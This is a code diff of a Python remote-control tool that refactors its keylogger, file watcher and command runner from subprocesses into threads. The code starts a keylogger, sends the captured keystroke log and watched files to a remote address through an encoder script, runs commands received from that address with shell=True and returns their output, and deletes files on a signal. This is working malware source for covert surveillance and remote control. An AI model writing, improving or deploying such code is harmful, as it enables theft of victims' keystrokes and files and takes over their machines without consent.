@@ -10,7 +10,9 @@ import requests  # Add this import for sending HTTP requests
 from threading import Lock  # Add this import for thread-safe access
 import platform
 import ctypes
-
+from encoder import main as encoder_main
+from logger import main as logger_main
+from watcher import main as watcher_main
 
 def get_local_ip():
     """Get the local IP address of the machine."""
@@ -214,48 +216,45 @@ def handle_initial_signal():
                         print(f"Failed to delete {filename}: {e}")
             os._exit(0)
 
+def send_log_file():
+    """Send the log file using the encoder script."""
+    log_file_path = os.path.join(os.getcwd(), "log.txt")
+    if os.path.isfile(log_file_path):
+        encoder_main(f"FT:{dest_ip}", log_file_path)
+    else:
+        print("Log file not found.")
 
 def start_keylogger():
     """Start the keylogger process."""
     global keylogger_process
-    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
     if not keylogger_process or keylogger_process.poll() is not None:
-        keylogger_process = subprocess.Popen(['python3', os.path.join(script_dir, 'logger.py')])
+        keylogger_process = threading.Thread(target=logger_main)
+        keylogger_process.start()
 
 def stop_keylogger():
     """Stop the keylogger process and send the log file."""
     global keylogger_process
     if keylogger_process:
-        keylogger_process.terminate()
+        keylogger_process.join(timeout=3)
         keylogger_process = None
-    time.sleep(3)
     send_log_file()
     print("Keylogger stopped and log file sent.")
 
 def start_watcher(file_path):
     """Start the watcher process."""
     global watcher_process
-    script_dir = os.path.abspath('.')
-    watcher_process = subprocess.Popen(['python3', os.path.join(script_dir, 'watcher.py'), file_path, dest_ip])
+    watcher_process = threading.Thread(target=watcher_main, args=(file_path, dest_ip))
+    watcher_process.start()
 
 def stop_watcher():
     """Stop the watcher process."""
     global watcher_process
     if watcher_process:
-        watcher_process.terminate()
+        watcher_process.join(timeout=3)
         watcher_process = None
-
-def send_log_file():
-    """Send the log file using the encoder script."""
-    log_file_path = os.path.join(os.getcwd(), "log.txt")
-    if os.path.isfile(log_file_path):
-        os.system(f'python3 encoder.py FT:{dest_ip} "{log_file_path}"')
-    else:
-        print("Log file not found.")
 
 def run_program(file_path):
     try:
-        # Execute command
         result = subprocess.run(
             file_path,
             shell=True,
@@ -265,16 +264,9 @@ def run_program(file_path):
             timeout=30
         )
         output = result.stdout
-        # send the output back to the encoder script
-        os.system(f'python3 encoder.py PT:{dest_ip} "{output}"')
-            
+        encoder_main(f"PT:{dest_ip}", output)
     except Exception as e:
-        subprocess.run([
-            "python3", "encoder.py",
-            f"CMD:{dest_ip}",
-            f"ERROR:{str(e)}"
-        ])
-
+        encoder_main(f"CMD:{dest_ip}", f"ERROR:{str(e)}")
 
 def handle_data(decoded_data):
     """Handle the received data based on the current signal."""
